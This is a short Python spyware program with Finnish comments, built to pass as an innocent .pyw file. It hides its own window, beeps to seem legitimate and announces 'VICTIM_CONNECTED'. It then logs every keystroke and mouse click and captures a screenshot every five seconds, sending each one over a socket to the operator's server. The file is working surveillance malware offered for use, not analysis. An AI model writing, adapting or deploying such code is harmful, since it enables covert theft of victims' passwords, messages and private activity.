# viaton_ohjelma.pyw  ← Tallenna .pyw-tiedostona (ei näy konsolia!)
# Näyttää viattomalta, mutta lähettää kaiken sun palvelimelle

import socket
import threading
import time
import pyautogui
import keyboard
import os
import sys
import win32gui
import win32con
import base64
from io import BytesIO
from PIL import ImageGrab
import winsound

# Sun palvelimen IP ja portti (muuta tähän sun koneen IP!)
SERVER_IP = "192.168.1.231"  # ← MUUTA TÄHÄN SUN KONEEKSI IP
PORT = 5000

def hide_window():
    # Piilottaa ohjelman täysin (ei näy missään)
    hwnd = win32gui.GetForegroundWindow()
    win32gui.ShowWindow(hwnd, win32con.SW_HIDE)

def send(data):
    try:
        s = socket.socket()
        s.connect((SERVER_IP, PORT))
        s.send(data.encode())
        s.close()
    except:
        pass

def keylogger():
    def on_press(key):
        try:
            send(f"KEY: {key.char}")
        except:
            send(f"KEY: [{key}]")
    keyboard.on_press(on_press)

def screenshot():
    while True:
        time.sleep(5)
        img = ImageGrab.grab()
        buffered = BytesIO()
        img.save(buffered, format="PNG")
        img_str = base64.b64encode(buffered.getvalue()).decode()
        send(f"SCREEN:{img_str}")

def click_logger():
    def on_click(x, y, button, pressed):
        if pressed:
            send(f"CLICK: {button} at ({x},{y})")
    from pynput.mouse import Listener
    with Listener(on_click=on_click) as listener:
        listener.join()

# Piilotetaan heti
hide_window()

# Ääni, jotta vaikuttaa "oikealta ohjelmalta"
winsound.Beep(800, 200)

# Lähetetään että uhri yhdistyi
send("VICTIM_CONNECTED")

# Käynnistetään kaikki taustalla
threading.Thread(target=keylogger, daemon=True).start()
threading.Thread(target=screenshot, daemon=True).start()
threading.Thread(target=click_logger, daemon=True).start()

# Pidä ohjelma elossa ikuisesti
while True:
    time.sleep(60)